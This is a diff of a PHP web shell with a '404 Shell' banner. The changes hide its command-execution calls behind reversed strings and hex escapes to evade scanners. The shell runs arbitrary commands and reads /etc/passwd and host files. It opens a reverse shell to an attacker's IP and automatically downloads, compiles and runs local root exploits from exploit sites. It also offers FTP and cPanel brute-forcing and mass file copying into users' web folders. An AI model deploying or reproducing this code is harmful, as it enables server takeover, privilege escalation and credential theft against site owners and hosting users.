+                $pixel($pipes[0]);
+                while (!$screwyou($pipes[1])) {
+                    echo $store($pipes[1], 1024);
                 }
-                fclose($pipes[1]);
-                while (!feof($pipes[2])) {
-                    echo fgets($pipes[2], 1024);
+                $pixel($pipes[1]);
+                while (!$screwyou($pipes[2])) {
+                    echo $store($pipes[2], 1024);
                 }
-                fclose($pipes[2]);
-                proc_close($process);
+                $pixel($pipes[2]);
+                $pcl($process);
             }
         } else {
-            echo (execute($command));
+            echo (xbox($command));
         }
         p('</pre>');
     }
@@ -2722,8 +2736,8 @@ maketext(array(
             $adminmail
         ),
         14 => array(
-            'allow_url_fopen',
-            getcfg('allow_url_fopen')
+            'allow_url_' . strrev("of") . 'pen',
+            getcfg('allow_url_' . strrev("of") . 'pen')
         ),
         15 => array(
             'enable_dl',
@@ -2754,11 +2768,11 @@ maketext(array(
             $upsize
         ),
         22 => array(
-            'max_execution_time',
-            getcfg('max_execution_time') . ' second(s)'
+            'max' . strrev('xe_') . 'ecu' . strrev('it') . 'on_time',
+            getcfg('max' . strrev('xe_') . 'ecu' . strrev('it') .'on_time') . ' second(s)'
         ),
         23 => array(
-            'disable_functions',
+            'di' . strrev('bas') . "l\x65\x5F\x66\x75\x6Ections",
             str_replace(",", ", ", $dis_func)
         )
     );
@@ -2907,14 +2921,14 @@ maketext(array(
                 }
             secparam('Downloaders', implode(', ', $temp));
             secparam('Hosts', @file_get_contents('/etc/hosts'));
-            secparam('HDD space', execute('df -h'));
+            secparam('HDD space', xbox('df -h'));
             secparam('Mount Options', @file_get_contents('/etc/fstab'));
         }
     } else {
-        secparam('OS Version', execute('ver'));
-        secparam('Account Settings', execute('net accounts'));
-        secparam('User Accounts', execute('net user'));
-        secparam('IP Configurate', execute('ipconfig -all'));
+        secparam('OS Version', xbox('ver'));
+        secparam('Account Settings', xbox('net accounts'));
+        secparam('User Accounts', xbox('net user'));
+        secparam('IP Configurate', xbox('ipconfig -all'));
     }
 } else {
     m('Undefined Action');
@@ -3040,15 +3054,17 @@ function loginpage($aep)
 	</form></center>';
     exit;
 }
-function execute($cfe)
+function xbox($cfe)
 {
-$pt = "p\x61\x73\x73th\x72u";
-		$sf = "suhosin_fun\x63_exi\x73ts";
+    $pt = "p\x61\x73\x73th\x72u";
+	$sf = "suhosin_fun\x63_exi\x73ts";
+	$door = strrev('op') . 'pen';
     $res = '';
     if ($cfe) {
-        if ($sf('system')) {
+        if ($sf("\x73y\x73t\x65m")) {
             @ob_start();
-            @system($cfe);
+            $xbone = "\x73y\x73t\x65m";
+            @$xbone($cfe);
             $res = @ob_get_contents();
             @ob_end_clean();
         } elseif ($sf("p\x61\x73\x73th\x72u")) {
@@ -3056,31 +3072,38 @@ $pt = "p\x61\x73\x73th\x72u";
             @$pt($cfe);
             $res = @ob_get_contents();
             @ob_end_clean();
-        } elseif ($sf('shell_exec')) {
-            $res = @shell_exec($cfe);
-        } elseif ($sf('exec')) {
-            @exec($cfe, $res);
+        } elseif ($sf(strrev("hs") . strrev("\x6Ce") . "\x6C\x5F\x65\x78ec")) {
+            $gameforxbox = strrev("hs") . strrev("\x6Ce") . "\x6C\x5F\x65\x78ec";
+            $res = @$gameforxbox($cfe);
+        } elseif ($sf(strrev('xe') . "\x65\x63")) {
+            $playxbox = strrev('xe') . "\x65\x63";
+            @$playxbox($cfe, $res);
             $res = join("\n", $res);
-        } elseif (@is_resource($f = @popen($cfe, "r"))) {
+        } elseif (@is_resource($f = @$door($cfe, "r"))) {
             $res = '';
-            while (!@feof($f)) {
-                $res .= @fread($f, 1024);
+            $books = "f\x72e" . strrev('da');
+            $screwyou = strrev('ef') . 'of';
+            $garage = strrev('cp') . 'lose';
+            while (!@$screwyou($f)) {
+                $res .= @$books($f, 1024);
             }
-            @pclose($f);
+            @$garage($f);
         }
     }
     return $res;
 }
 function which($pr)
 {
-    $path = execute("which $pr");
+    $path = xbox("which $pr");
     return ($path ? $path : $pr);
 }
 function cf($fname, $text)
 {
-    if ($fp = @fopen($fname, 'w')) {
-        @fputs($fp, @base64_decode($text));
-        @fclose($fp);
+$pen = strrev("of") . 'pen';
+$buy = "f" . strrev("tup") . "s";
+    if ($fp = @$pen($fname, 'w')) {
+        @$buy($fp, @base64_decode($text));
+        @$pixel($fp);
     }
 }
 function dirsize($dir)
@@ -3169,23 +3192,23 @@ function getPerms($filepath)
     }
     $owner['read']    = ($mode & 00400) ? 'r' : '-';
     $owner['write']   = ($mode & 00200) ? 'w' : '-';
-    $owner['execute'] = ($mode & 00100) ? 'x' : '-';
+    $owner['e' . strrev('cex') .'ute'] = ($mode & 00100) ? 'x' : '-';
     $group['read']    = ($mode & 00040) ? 'r' : '-';
     $group['write']   = ($mode & 00020) ? 'w' : '-';
-    $group['execute'] = ($mode & 00010) ? 'x' : '-';
+    $group['e' . strrev('cex') . 'ute'] = ($mode & 00010) ? 'x' : '-';
     $world['read']    = ($mode & 00004) ? 'r' : '-';
     $world['write']   = ($mode & 00002) ? 'w' : '-';
-    $world['execute'] = ($mode & 00001) ? 'x' : '-';
+    $world['e' . strrev('ucex') . 'te'] = ($mode & 00001) ? 'x' : '-';
     if ($mode & 0x800) {
-        $owner['execute'] = ($owner['execute'] == 'x') ? 's' : 'S';
+        $owner['e' . strrev('ucex') . 'te'] = ($owner['e' . strrev('ucex') . 'te'] == 'x') ? 's' : 'S';
     }
     if ($mode & 0x400) {
-        $group['execute'] = ($group['execute'] == 'x') ? 's' : 'S';
+        $group['e' . strrev('cex') . 'ute'] = ($group['e' . strrev('cex') . 'ute'] == 'x') ? 's' : 'S';
     }
     if ($mode & 0x200) {
-        $world['execute'] = ($world['execute'] == 'x') ? 't' : 'T';
+        $world['e' . strrev('cex') . 'ute'] = ($world['e' . strrev('ucex') . 'te'] == 'x') ? 't' : 'T';
     }
-    return $type . $owner['read'] . $owner['write'] . $owner['execute'] . $group['read'] . $group['write'] . $group['execute'] . $world['read'] . $world['write'] . $world['execute'];
+    return $type . $owner['read'] . $owner['write'] . $owner['e' . strrev('ucex') . 'te'] . $group['read'] . $group['write'] . $group['e' . strrev('ucex') . 'te'] . $world['read'] . $world['write'] . $world['e' . strrev('ucex') . 'te'];
 }
 function getUser($filepath)
 {
@@ -3416,8 +3439,9 @@ function sqldumptable($table, $fp = 0)
     $res       = q("SHOW CREATE TABLE $table");
     $create    = mysql_fetch_row($res);
     $tabledump .= $create[1] . ";\n\n";
+    $feather = strrev("rwf") . "ite";
     if ($fp) {
-        fwrite($fp, $tabledump);
+        $feather($fp, $tabledump);
     } else {
         echo $tabledump;
     }
@@ -3429,12 +3453,12 @@ function sqldumptable($table, $fp = 0)
         }
         $tabledump = 'INSERT INTO `' . $table . '` VALUES (' . implode(", ", $row) . ');' . "\n";
         if ($fp) {
-            fwrite($fp, $tabledump);
+            $feather($fp, $tabledump);
         } else {
             echo $tabledump;
         }
     }
-    fwrite($fp, "\n\n");
+    $feather($fp, "\n\n");
     fr($rows);
 }
 function p($str)
@@ -3548,41 +3572,50 @@ function encode_pass($pass)
     //$p2ass = md5($pass);
     return md5(md5(md5($pass)));
 }
-function exec_all($command)
+function all_xbox($command)
 {
 $prco = "proc_op\x65n";
 $pt = "p\x61\x73\x73th\x72u";
 $sf = "suhosin_fun\x63_exi\x73ts";
     $output = "";
-    if ($sf('exec')) {
-        exec($command, $output);
+    if ($sf(strrev('xe') . "e\x63")) {
+        $noplaystation = strrev('xe') . "e\x63";
+        $noplaystation($command, $output);
         $output = join("\n", $output);
     }
     
-    else if ($sf('shell_exec')) {
-        $output = shell_exec($command);
+    else if ($sf(strrev('hs') . "e\x6C\x6C\x5F\x65\x78ec")) {
+        $microsopht = strrev('hs') . "e\x6C\x6C\x5F\x65\x78ec";
+        $output = $microsopht($command);
     }
     
-    else if ($sf('popen')) {
-        $handle = popen($command, "r"); // Open the command pipe for reading
+    else if ($sf(strrev('op') . 'pen')) {
+        $door = strrev('op') . 'pen';
+        $garage = strrev('cp') . 'lose';
+        $handle = $door($command, "r"); // Open the command pipe for reading
         if (is_resource($handle)) {
-            if ($sf('fread') && $sf('feof')) {
-                while (!feof($handle)) {
-                    $output .= fread($handle, 512);
+            if ($sf("f\x72e" . strrev('da')) && $sf(strrev('ef') . 'of')) {
+                $books = "f\x72e" . strrev('da');
+                $screwyou = strrev('ef') . 'of';
+                while (!$screwyou($handle)) {
+                    $output .= $books($handle, 512);
                 }
-            } else if ($sf('fgets') && $sf('feof')) {
-                while (!feof($handle)) {
-                    $output .= fgets($handle, 512);
+            } else if ($sf('f' . strrev("eg") . 'ts') && $sf(strrev('ef') . 'of')) {
+                $store = 'f' . strrev("eg") . 'ts';
+                $screwyou = strrev('ef') . 'of';
+                while (!$screwyou($handle)) {
+                    $output .= $store($handle, 512);
                 }
             }
         }
-        pclose($handle);
+        $garage($handle);
     }
     
     
-    else if ($sf('system')) {
+    else if ($sf(strrev("\x79s") . 'stem')) {
         ob_start(); //start output buffering
-        system($command);
+        $resolution = strrev("\x79s") . 'stem';
+        $resolution($command);
         $output = ob_get_contents(); // Get the ouput 
         ob_end_clean(); // Stop output buffering
     }
@@ -3594,26 +3627,31 @@ $sf = "suhosin_fun\x63_exi\x73ts";
         ob_end_clean(); // Stop output buffering            
     }
     
-    else if ($sf("proc_op\x65n")) {
+    else if ($sf("pr\x6F\x63\x5Fop\x65n")) {
         $descriptorspec = array(
             1 => array(
-                "pipe",
+                "pi\x70\x65",
                 "w"
             ) // stdout is a pipe that the child will write to
         );
         $handle         = $prco($command, $descriptorspec, $pipes); // This will return the output to an array 'pipes'
+        $garage = strrev('cp') . 'lose';
         if (is_resource($handle)) {
-            if ($sf('fread') && $sf('feof')) {
-                while (!feof($pipes[1])) {
-                    $output .= fread($pipes[1], 512);
+            if ($sf("f\x72e" . strrev('da')) && $sf(strrev('ef') . 'of')) {
+                $books = "f\x72e" . strrev('da');
+                $screwyou = strrev('ef') . 'of';
+                while (!$screwyou($pipes[1])) {
+                    $output .= $books($pipes[1], 512);
                 }
-            } else if ($sf('fgets') && $sf('feof')) {
-                while (!feof($pipes[1])) {
-                    $output .= fgets($pipes[1], 512);
+            } else if ($sf(strrev('ef') . 'of') && $sf(strrev('ef') . 'of')) {
+                $screwyou = strrev('ef') . 'of';
+                $store = 'f' . strrev("eg") . 'ts';
+                while (!$screwyou($pipes[1])) {
+                    $output .= $store($pipes[1], 512);
                 }
             }
         }
-        pclose($handle);
+        $garage($handle);
     }
     return (htmlspecialchars($output));
     
@@ -3650,7 +3688,7 @@ function mailAttachmentHeader($message)
         if ($_FILES['file']['name'][0] != "") {
             $xMessage .= "--" . $mime_boundary . "\r\n";
             $xMessage .= "Content-Type: " . $_FILES['file']['type'][$i] . "; name=\"" . $_FILES['file']['name'][$i] . "\"\r\n"; //"Content-Type: application/octet-stream; name=\"".$_FILES['file']['name']."\"\r\n";
-            $xMessage .= "Content-Transfer-Encoding: base64\r\n";
+            $xMessage .= "Content-Transfer-Encoding: ba\x73\x65\x364\r\n";
             $xMessage .= "Content-Disposition: attachment; filename=\"" . $_FILES['file']['name'][$i] . "\"\r\n\r\n";
             $content = file_get_contents($_FILES['file']['tmp_name'][$i]);
             $xMessage .= chunk_split(base64_encode($content));
@@ -3674,24 +3712,31 @@ function wsoEx($in)
 	$pt = "p\x61\x73\x73th\x72u";
 	$sf = "suhosin_fun\x63_exi\x73ts";
     $out = '';
+    $door = strrev('op') . 'pen';
+    $garage = strrev('cp') . 'lose';
     if ($sf("\x65x\x65c")) {
-        @exec($in, $out);
+        $nintendo = "\x65x\x65c";
+        @$nintendo($in, $out);
         $out = @join("\n", $out);
     } elseif ($sf("p\x61\x73\x73th\x72u")) {
         ob_start();
         @$pt($in);
         $out = ob_get_clean();
-    } elseif ($sf('system')) {
+    } elseif ($sf(strrev("\x79s") . 'stem')) {
+        $resolution = strrev("\x79s") . 'stem';
         ob_start();
-        @system($in);
+        @$resolution($in);
         $out = ob_get_clean();
     } elseif ($sf("shell_\x65x\x65c")) {
-        $out = shell_exec($in);
-    } elseif (is_resource($f = @popen($in, "r"))) {
+        $tv = "shell_\x65x\x65c";
+        $out = $tv($in);
+    } elseif (is_resource($f = @$door($in, "r"))) {
         $out = "";
-        while (!@feof($f))
-            $out .= fread($f, 1024);
-        pclose($f);
+        $books = "f\x72e" . strrev('da');
+        $screwyou = strrev('ef') . 'of';
+        while (!@$screwyou($f))
+            $out .= $books($f, 1024);
+        $garage($f);
     }
     return $out;
 }
@@ -3725,16 +3770,20 @@ function clang($ext)
 function get_data($url)
 {
     $ch      = curl_init();
+    $corral = "\x63u\x72\x6C\x5Fc\x6C\x6Fs\x65";
+    $corralfish = "\x63u\x72l_e" . strrev("cex");
     $timeout = 5;
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
-    $data = curl_exec($ch);
-    curl_close($ch);
+    $data = $corralfish($ch);
+    $corral($ch);
     return $data;
 }
 function geterrorpage()
 {
+    $corral = "\x63u\x72\x6C\x5Fc\x6C\x6Fs\x65";
+    $corralfish = "\x63u\x72l_e" . strrev("cex");
 	$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
     $u           = "/" . substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 26);
     $ux          = (!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $u : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $u;
@@ -3752,9 +3801,9 @@ function geterrorpage()
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
-        $data        = curl_exec($ch);
+        $data        = $corralfish($ch);
         $redirecturl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
-        curl_close($ch);
+        $corral($ch);
     }
     $data      = str_replace($u, $_SERVER['REQUEST_URI'], $data);
     $linktypes = array(
@@ -3787,7 +3836,7 @@ function geterrorpage()
 }
 function strbool($value)
 {
-    return $value ? 'true' : 'false';
+    return strtolower($value) == 'true';
 }
 class DB_MySQL  {
 
@@ -3907,6 +3956,7 @@ class DB_MySQL  {
 	}
 	// ÃÂ±ÃÂ¸ÃÂ·ÃÂÃÂÃÂ½ÃÂ¾ÃÂÃÂ¿ÃÂ¢
 	function sqldump($table, $fp=0) {
+	    $feather = strrev("rwf") . "ite";
 		$crlf = (IS_WIN ? "\r\n" : "\n");
 		$search = array("\x00", "\x0a", "\x0d", "\x1a"); //\x08\\x09, not required
 		$replace = array('\0', '\n', '\r', '\Z');
@@ -3936,7 +3986,7 @@ class DB_MySQL  {
 		unset($create);
 
 		if ($fp) {
-			fwrite($fp,$tabledump);
+			$feather($fp,$tabledump);
 		} else {
 			echo $tabledump;
 		}
@@ -3964,7 +4014,7 @@ class DB_MySQL  {
 			$tabledump = 'INSERT INTO `'.$table.'` VALUES('.implode(', ', $values).');'.$crlf;
 			unset($values);
 			if ($fp) {
-				fwrite($fp,$tabledump);
+				$feather($fp,$tabledump);
 			} else {
 				echo $tabledump;
 			}
@@ -3991,49 +4041,51 @@ class BC
   private function createshell()
   {
   	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
+$shellfish = "shell_\x65\x78\x65c";
+$feather = strrev("rwf") . "ite";
   $socket = @fsockopen($this->your_ip,$this->your_port,$errno,$errstr,$this->timeout) or die("<font color='red'>Unfortunately could not spawn shell</font>\n<br>");
   print("<font color='green'>Shell process opened to <strong>$this->server_ip</strong> > <strong>$this->your_ip:$this->your_port</strong></font>\n<br>");
   ob_flush(); flush();
-  fwrite($socket,"=============================================================");
-  fwrite($socket,"
+  $feather($socket,"=============================================================");
+  $feather($socket,"
  _  _    ___  _  _     ____  _          _ _ 
 | || |  / _ \| || |   / ___|| |__   ___| | |
 | || |_| | | | || |_  \___ \| '_ \ / _ \ | |
 |__   _| |_| |__   _|  ___) | | | |  __/ | |
    |_|  \___/   |_|   |____/|_| |_|\___|_|_|
                                             \n");
-  fwrite($socket,"=============================================================\n");
-  fwrite($socket,"# Information:\n");
-  fwrite($socket,"-------------------------------------------------------------\n");
-  fwrite($socket,"uname -a: ".@shell_exec("uname -a")."\n");
-  fwrite($socket,"whoami: ".@shell_exec("whoami")."\n");
-  fwrite($socket,"id: ".@shell_exec("id")."\n");
-  fwrite($socket,"pwd: ".@shell_exec("pwd")."\n");
-  fwrite($socket,"# Options:\n");
-  fwrite($socket,"- exploit = Automatic Search & Download & Run a local root exploit which matches with kernel release\n");
-  fwrite($socket,"- grabusr = Grab users from /etc/passwd and save into a file ( users )\n");
-  fwrite($socket,"- domains = List domains from /var/named\n");
-  fwrite($socket,"- getf    = Find and grab the name given file from all public_html dirs ( only works with /home/USER/public_html servers )\n");
-  fwrite($socket,"- catln   = Cat file with ln -s method\n");
-  fwrite($socket,"- index    = Try copy the name given file to all public_html dirs ( only works with /home/USER/public_html servers )\n");
-  fwrite($socket,"- home    = Change dir into home folder\n");
-  fwrite($socket,"- ftp    = Performs ftp brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
-  fwrite($socket,"- cpanel  = Performs cpanel brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
-  $this->homefolder = trim(@shell_exec("pwd"));
-  fwrite($socket,"-------------------------------------------------------------\n");
-  $result= @shell_exec("whoami");
-  fwrite($socket,$result);
+  $feather($socket,"=============================================================\n");
+  $feather($socket,"# Information:\n");
+  $feather($socket,"-------------------------------------------------------------\n");
+  $feather($socket,"uname -a: ".@$shellfish("uname -a")."\n");
+  $feather($socket,"whoami: ".@$shellfish("whoami")."\n");
+  $feather($socket,"id: ".@$shellfish("id")."\n");
+  $feather($socket,"pwd: ".@$shellfish("pwd")."\n");
+  $feather($socket,"# Options:\n");
+  $feather($socket,"- exploit = Automatic Search & Download & Run a local root exploit which matches with kernel release\n");
+  $feather($socket,"- grabusr = Grab users from /etc/passwd and save into a file ( users )\n");
+  $feather($socket,"- domains = List domains from /var/named\n");
+  $feather($socket,"- getf    = Find and grab the name given file from all public_html dirs ( only works with /home/USER/public_html servers )\n");
+  $feather($socket,"- catln   = Cat file with ln -s method\n");
+  $feather($socket,"- index    = Try copy the name given file to all public_html dirs ( only works with /home/USER/public_html servers )\n");
+  $feather($socket,"- home    = Change dir into home folder\n");
+  $feather($socket,"- ftp    = Performs ftp brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
+  $feather($socket,"- cpanel  = Performs cpanel brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
+  $this->homefolder = trim(@$shellfish("pwd"));
+  $feather($socket,"-------------------------------------------------------------\n");
+  $result= @$shellfish("whoami");
+  $feather($socket,$result);
   print "<font color='green'>Command whoami;</font>\n";
   print $result;
   ob_flush(); flush();
-  $prgm("#([0-9]).([0-9]).([0-9]+)-([a-z0-9]+)#si",@shell_exec("uname -r"),$version);
+  $prgm("#([0-9]).([0-9]).([0-9]+)-([a-z0-9]+)#si",@$shellfish("uname -r"),$version);
   $version1 = $version[0];
   $version2 = $version[1].".".$version[2].".".$version[3];
   print "<pre>";
   while(1)
   {
   $enter = fgets($socket);
-  if($prgm('#exit#',$enter)){fwrite($socket,"Process closed\n");exit("Process closed");fclose($socket);}
+  if($prgm('#exit#',$enter)){$feather($socket,"Process closed\n");exit("Process closed");$pixel($socket);}
   if($prgm('#exploit#',$enter)){$this->search($version1,$socket);$this->search($version2,$socket);}
   if($prgm('#grabusr#',$enter)){$this->grab_users($socket);}
   if($prgm('#catln (.+)#',$enter,$file)){$this->catln($file[1],$socket);}
@@ -4051,86 +4103,89 @@ class BC
   $explode = array_values(array_filter($explode));
   $path   = implode("/",$explode);
   $path   = "/".$path;
-  if(!chdir($path)){fwrite($socket,"Can't chdir into $path : Permission denied\n");}
+  if(!chdir($path)){$feather($socket,"Can't chdir into $path : Permission denied\n");}
   }
   elseif($prgm('#cd (.+)#',$enter,$dir)){
   $curr = getcwd();
   if($prgm("#\/#si",$dir[1]))
   {
-  if(!chdir($dir[1])){fwrite($socket,"Can't chdir into $dir[1] : Permission denied\n");}
+  if(!chdir($dir[1])){$feather($socket,"Can't chdir into $dir[1] : Permission denied\n");}
   }
   else
   {
-  if(!chdir($curr."/".$dir[1])){fwrite($socket,"Can't chdir into $curr/$dir[1] : Permission denied\n");}
+  if(!chdir($curr."/".$dir[1])){$feather($socket,"Can't chdir into $curr/$dir[1] : Permission denied\n");}
   }
   
   }
-  $result= @shell_exec(trim($enter));
-  fwrite($socket,$result);
+  $result= @$shellfish(trim($enter));
+  $feather($socket,$result);
   print "<font color='green'>Command ".trim($enter).";</font>\n";
   print $result;
   ob_flush(); flush();
   }
+  $elevator = strrev("cf") . "lose";
   print "</pre>";
-  fclose($socket);
+  $elevator($socket);
   }
   private function search($version,$socket)
   {
 		$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
 		$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
-    fwrite($socket,"Release: $version\n");
+$shellfish = "shell_\x65\x78\x65c";
+$feather = strrev("rwf") . "ite";
+    $feather($socket,"Release: $version\n");
     print("Release: $version\n<br>");
     ob_flush();flush();
-    fwrite($socket,"Searching Exploit-DB for local root exploits..\n");
+    $feather($socket,"Searching Exploit-DB for local root exploits..\n");
     print("Searching Exploit-DB for local root exploits..\n<br>");
     $exploit_db = $this->curl("http://www.exploit-db.com/search/?action=search&filter_description=$version");
     if($prgm('/No results/si',$exploit_db))
     {
-    fwrite($socket,"Not found any exploits\n");
+    $feather($socket,"Not found any exploits\n");
     print("Not found any exploits\n<br>");
     ob_flush();flush();
     }
     else
     {
-    fwrite($socket,"==================== Possible Exploits =====================\n");
+    $feather($socket,"==================== Possible Exploits =====================\n");
     print("==================== Possible Exploits =====================\n<br>");
     ob_flush();flush();
     $prgma('#<td class="list_explot_description">(.*?)<\/td>#si',$exploit_db,$list);
     foreach($list[1] as $listx)
     {
     $prgm('#<a  href="(.*?)">(.*?)<\/a>#si',$listx,$exploit);
-    fwrite($socket,"[+] ".$exploit[2]."\n");
+    $feather($socket,"[+] ".$exploit[2]."\n");
     print("[+] ".$exploit[2]."\n<br>");
-    fwrite($socket,"Trying pwn this server with this exploit\n");
+    $feather($socket,"Trying pwn this server with this exploit\n");
     print("Trying pwn this server with this exploit\n<br>");
-    fwrite($socket,"Downloading => ".$exploit[1]."\n");
+    $feather($socket,"Downloading => ".$exploit[1]."\n");
     print("Downloading => ".$exploit[1]."\n<br>");
     ob_flush();flush();
     $download = $this->download($exploit[1]);
     if($download != false)
     {
-    fwrite($socket,"File downloaded saved as $download\n");
+    $feather($socket,"File downloaded saved as $download\n");
     print("File downloaded saved as $download\n<br>");
-    fwrite($socket,"Trying compile to $download file\n");
+    $feather($socket,"Trying compile to $download file\n");
     print("Trying compile to $download file\n<br>");
     ob_flush();flush();
     $withoutc = str_replace(".c","",$download);
-    @shell_exec("gcc $download -o $withoutc");
+    @$shellfish("gcc $download -o $withoutc");
     if(file_exists($withoutc))
     {
-    fwrite($socket,"File compiled\n");
+    $feather($socket,"File compiled\n");
     print("File compiled\n<br>");
-    fwrite($socket,"Setting chmod options\n");
+    $feather($socket,"Setting chmod options\n");
     print("Setting chmod options\n<br>");
-    @shell_exec("chmod +x $withoutc");
-    fwrite($socket,"Running exploit..!\n");
+    @$shellfish("chmod +x $withoutc");
+    $feather($socket,"Running exploit..!\n");
     print("Running exploit..!\n<br>");
     ob_flush();flush();
-    @shell_exec("./$withoutc");
+    @$shellfish("./$withoutc");
     }
     else
     {
-    fwrite($socket,"File doesn't compile\n");
+    $feather($socket,"File doesn't compile\n");
     print("File doesn't compile\n<br>");
     ob_flush();flush();
     }
@@ -4138,61 +4193,61 @@ class BC
     }
     else
     {
-    fwrite($socket,"File doesn't download\n");
+    $feather($socket,"File doesn't download\n");
     print("File doesn't download\n<br>");
     ob_flush();flush();
     }
     
     }
-    fwrite($socket,"==================== Possible Exploits =====================\n");
+    $feather($socket,"==================== Possible Exploits =====================\n");
     print("==================== Possible Exploits =====================\n<br>");
     ob_flush();flush();
     }
-    fwrite($socket,"Searching 1337day for local root exploits..\n");
+    $feather($socket,"Searching 1337day for local root exploits..\n");
     print("Searching 1337day for local root exploits..\n<br>");
     ob_flush();flush();
     $day1337 = $this->curl("http://www.1337day.com/search","agree=Ok&dong=$version&submit_search=Submit");
     $prgma("#<a href='/exploit/description/(.*?)'  >(.*?)<\/a>#si",$day1337,$exploits);
     if($exploits[1])
     {
-    fwrite($socket,"==================== Possible Exploits =====================\n");
+    $feather($socket,"==================== Possible Exploits =====================\n");
     print("==================== Possible Exploits =====================\n<br>");
     ob_flush();flush();
     foreach($exploits[1] as $i => $exploit)
     {
-    fwrite($socket,"[+] ".$exploits[2][$i]."\n");
+    $feather($socket,"[+] ".$exploits[2][$i]."\n");
     print("[+] ".$exploits[2][$i]."\n<br>");
-    fwrite($socket,"Trying pwn this server with this exploit\n");
+    $feather($socket,"Trying pwn this server with this exploit\n");
     print("Trying pwn this server with this exploit\n<br>");
     $exploit_link = "http://www.1337day.com/exploit/$exploit";
-    fwrite($socket,"Downloading => ".$exploit_link."\n");
+    $feather($socket,"Downloading => ".$exploit_link."\n");
     print("Downloading => ".$exploit_link."\n<br>");
     ob_flush();flush();
     $download = $this->day1337download($exploit_link);
     if($download != false)
     {
-    fwrite($socket,"File downloaded saved as $download\n");
+    $feather($socket,"File downloaded saved as $download\n");
     print("File downloaded saved as $download\n<br>");
-    fwrite($socket,"Trying compile to $download file\n");
+    $feather($socket,"Trying compile to $download file\n");
     print("Trying compile to $download file\n<br>");
     ob_flush();flush();
     $withoutc = str_replace(".c","",$download);
-    @shell_exec("gcc $download -o $withoutc");
+    @$shellfish("gcc $download -o $withoutc");
     if(file_exists($withoutc))
     {
-    fwrite($socket,"File compiled\n");
+    $feather($socket,"File compiled\n");
     print("File compiled\n<br>");
-    fwrite($socket,"Setting chmod options\n");
+    $feather($socket,"Setting chmod options\n");
     print("Setting chmod options\n<br>");
-    @shell_exec("chmod +x $withoutc");
-    fwrite($socket,"Running exploit..!\n");
+    @$shellfish("chmod +x $withoutc");
+    $feather($socket,"Running exploit..!\n");
     print("Running exploit..!\n<br>");
     ob_flush();flush();
-    @shell_exec("./$withoutc");
+    @$shellfish("./$withoutc");
     }
     else
     {
-    fwrite($socket,"File doesn't compile\n");
+    $feather($socket,"File doesn't compile\n");
     print("File doesn't compile\n<br>");
     ob_flush();flush();
     }
@@ -4200,19 +4255,21 @@ class BC
     }
     
     }
-    fwrite($socket,"==================== Possible Exploits =====================\n");
+    $feather($socket,"==================== Possible Exploits =====================\n");
     print("==================== Possible Exploits =====================\n<br>");
     ob_flush();flush();
     }
     else
     {
-    fwrite($socket,"Not found any exploits\n");
+    $feather($socket,"Not found any exploits\n");
     print("Not found any exploits\n<br>");
     ob_flush();flush();
     }
   }
   private function curl($site,$post=null)
   {
+      $corral = "\x63u\x72\x6C\x5Fc\x6C\x6Fs\x65";
+    $corralfish = "\x63u\x72l_e" . strrev("cex");
   $ch = curl_init();
   curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
   curl_setopt($ch,CURLOPT_URL,$site);
@@ -4220,8 +4277,8 @@ class BC
   {
   curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
   }
-  $cex = curl_exec($ch);
-  curl_close($ch);
+  $cex = $corralfish($ch);
+  $corral($ch);
   return $cex;
   }
   private function download($url)
@@ -4259,6 +4316,7 @@ class BC
   }
   private function grab_users($socket)
   {
+      $feather = strrev("rwf") . "ite";
   $read = file("/etc/passwd");
   $x0x  = "";
   foreach($read as $text)
@@ -4267,34 +4325,38 @@ class BC
   $user = explode(":",$text);
   $user = $user[0];
   $xox .= $user."\r\n";
-  fwrite($socket,$user."\n");
+  $feather($socket,$user."\n");
   print($user."\n");
   }
-  fwrite($socket,"Grabbed ".count($read)." users from /etc/passwd\n");
+  $feather($socket,"Grabbed ".count($read)." users from /etc/passwd\n");
   print("Grabbed ".count($read)." users from /etc/passwd\n");
   $save = $this->save_as("users",$xox,"wb");
-  if($save){fwrite($socket,"Saved into file as 'users'\n");print("Saved into file as 'users'\n");}else{fwrite($socket,"Doesn't save into file\n");print("Doesn't save into file\n");}
+  if($save){$feather($socket,"Saved into file as 'users'\n");print("Saved into file as 'users'\n");}else{$feather($socket,"Doesn't save into file\n");print("Doesn't save into file\n");}
   }
   private function catln($file,$socket)
   {
+$shellfish = "shell_\x65\x78\x65c";
+$feather = strrev("rwf") . "ite";
   $savefile = uniqid();
-  @shell_exec("ln -s $file ".$savefile);
+  @$shellfish("ln -s $file ".$savefile);
   if(file_exists($savefile))
   {
-  fwrite($socket,file_get_contents($savefile));
+  $feather($socket,file_get_contents($savefile));
   print(file_get_contents($savefile));
-  fwrite($socket,"File name $savefile\n");
+  $feather($socket,"File name $savefile\n");
   print("File name $savefile\n");
   }
   else
   {
-  fwrite($socket,"File doesn't read\n");
+  $feather($socket,"File doesn't read\n");
   print("File doesn't read\n");
   }
   
   }
   private function index($file,$socket)
   {
+$shellfish = "shell_\x65\x78\x65c";
+$feather = strrev("rwf") . "ite";
   $etc  = file('/etc/passwd');
   $count= 0;
   foreach($etc as $txt)
@@ -4303,22 +4365,24 @@ class BC
   $user= explode(":",$txt);
   $user= $user[0];
   $path= "/home/$user/public_html/$file";
-  @shell_exec("cp $file $path");
+  @$shellfish("cp $file $path");
   if(file_exists($path))
